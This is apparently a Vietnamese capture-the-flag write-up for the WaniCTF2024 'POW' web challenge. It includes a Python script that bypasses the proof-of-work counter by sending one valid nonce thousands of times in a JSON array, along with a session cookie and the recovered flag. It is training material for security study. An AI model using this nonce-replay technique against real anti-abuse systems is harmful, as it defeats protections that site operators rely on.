# POW

![342194670-c86802d9-0f81-4d72-87e3-631920d89343](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/ab9cf379-df80-4cad-9d27-d71e19146f1d)


- Recon:

  + ta có thông tin về client status và server status có vẻ client_status đang check số hợp lệ từ đó server sẽ tăng lên 1 ứng với mỗi giá trị hợp lệ
 
  + checking thì ta có thêm thông tin về json của server /api/pow đang ở progress là 0/1000000 vì client chưa tìm được giá trị hợp hợp lệ
 
  + theo đề bài là ta cần tìm giá trị hợp lệ qua cách tính crypto hash nhưng ta sẽ tìm qua hành vi của trang web
 
- Exploit:

   + 2 cách để exploit có thể là dùng python hoặc brupsuite
 

+ brupsuite:

![342203686-a5abce81-84ac-48cb-907b-8a4ce0bbfb5b](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/9f00b1cd-4a22-403c-a1ef-fadd7866c43a)


- ta lấy được giá trị hợp lệ là 2862152 và ta sẽ cho vào array json với giá trị tăng dần đến 1000000

![342205870-e2be6721-0db3-45cd-9a9c-de7f0a06fb49](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/90064355-84d0-47d5-9fd6-f80aa6323031)


+ dùng python chạy loop tới 

payload:

```
import requests

# URL của API
url = 'https://web-pow-lz56g6.wanictf.org/api/pow'

# Tạo payload với 5000 phần tử '2862152'
payload = ['2862152'] * 20000

# Cookies
cookies = {
    'pow_session': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiIzMzU0ODI1Ny0zYzc2LTQ5MjYtYjc0Yy0yM2NkZWU5YjVhYTkifQ.vOmdV80weNiFDGcKSSg1fZwB1LDboRwlaIJnEN8uFJI'
}

# Lặp 20 lần để gửi yêu cầu POST
for _ in range(20):
    # Gửi yêu cầu POST và lấy phản hồi
    response = requests.post(url, json=payload, cookies=cookies)

    # In ra nội dung phản hồi
    print(f"Response {_ + 1}: {response.text}")

```

![342257284-33d5965a-7622-4274-aefc-182a66d546ff](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/600e5f33-6371-48da-b71a-53362fcac7dc)


=> ta sẽ send response đến server với giá trị hợp lệ và kết nối tăng trong array 

![342258434-be9c5f20-3675-478a-9800-b474ca4722b0](https://github.com/LDV-SpaceK/WaniCTF2024/assets/152776722/7c4a2d41-00f9-4a56-90eb-288ee61e45dd)





=> flag = FLAG{N0nCE_reusE_i$_FUn}
